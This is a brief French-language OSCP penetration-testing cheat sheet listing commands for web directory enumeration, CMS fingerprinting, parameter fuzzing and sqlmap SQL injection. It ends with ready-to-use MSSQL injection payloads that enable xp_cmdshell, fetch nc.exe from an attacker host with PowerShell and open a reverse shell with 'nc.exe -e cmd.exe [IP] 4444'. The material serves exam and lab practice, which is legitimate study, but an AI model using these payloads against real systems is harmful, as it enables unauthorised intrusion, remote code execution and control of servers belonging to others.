<img src="https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/6ada07ef-1fa7-4bad-83ff-78d636d8a6b5" height="180">

## Énumération des pages web :
dirb http://[IP] -X .php,.html,.txt  
gobuster –url [IP] dir –wordlist /usr/share/wordlists/dirb/big.txt -x php,txt,html  
## Identification de CMS :
whatweb [URL]  
python3 cmseek.py -u [URL]  
## Recherche des paramettres GET :
wfuzz --hh=[SIZE] -w [WORDLIST] [URL].php?[PARAM_NAME]=test  
## Recherche des fichiers backup :
dirb http://[fichier a tester] /usr/share/wordlists/dirb/mutations_common.txt -t
## Injection SQL :
sqlmap -u [URL] (--dbs / --tables -D [DATABASE] / --columns -D [DATABASE] -T [TABLENAME])  
sqlmap -r [FILE] (--dbs / --tables -D [DATABASE] / --columns -D [DATABASE] -T [TABLENAME])   
A la main: http://192.168.1.50/wordpress/sql-injection-cheat-sheet/  

**commande injection in MSQL:**  
admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+  
admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+  
admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+  
admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+  
EXEC xp_cmdshell 'powershell.exe wget http://[IP]/nc.exe -OutFile c:\\Users\Public\\nc.exe'  
EXEC xp_cmdshell 'c:\\Users\Public\\nc.exe -e cmd.exe [IP] 4444'  
